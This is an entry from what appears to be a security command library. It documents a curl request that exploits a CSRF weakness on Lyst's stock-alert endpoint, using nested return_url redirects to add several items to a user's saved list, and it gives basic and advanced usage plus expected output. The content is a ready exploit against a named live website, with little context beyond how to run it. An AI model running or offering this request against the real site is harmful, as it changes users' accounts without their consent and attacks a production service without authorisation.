---
data: >-
  curl -X GET
  "https://www.lyst.com/email-capture/stock-alert/93543518/?return_url=/email-capture/stock-alert/91703404/?return_url=/email-capture/stock-alert/89201857/"
  -v
tags:
  - csrf
  - chain
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:42.552Z'
id: 983fd7a3-ef04-4b3b-a3cb-829a5160e847
verified: false
validated: true
submitted: true
---
# csrf-chained-stock-alert-get

## Command

```bash
curl -X GET "https://www.lyst.com/email-capture/stock-alert/93543518/?return_url=/email-capture/stock-alert/91703404/?return_url=/email-capture/stock-alert/89201857/" -v
```

## Description

Sends a GET request to Lyst's stock alert endpoint with nested return_url parameters to chain multiple item additions to the user's saved list via internal redirects, exploiting CSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Base URL path | Starting stock-alert endpoint with product ID | Yes |
| return_url | Nested chain of additional stock-alert URLs | Yes |
| -v | Verbose mode for tracing redirects | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.lyst.com/email-capture/stock-alert/93543518/?return_url=/email-capture/stock-alert/91703404/?return_url=/email-capture/stock-alert/89201857/" -v
```

### Advanced Usage

```bash
curl -X GET "https://www.lyst.com/email-capture/stock-alert/ID1/?return_url=/email-capture/stock-alert/ID2/?return_url=..." -v -L
```

## Expected Output

Multiple 302 redirects in verbose output; three items added to saved list (IDs: 93543518, 91703404, 89201857).

## Related

- [[commands/test-stock-alert-endpoint]]
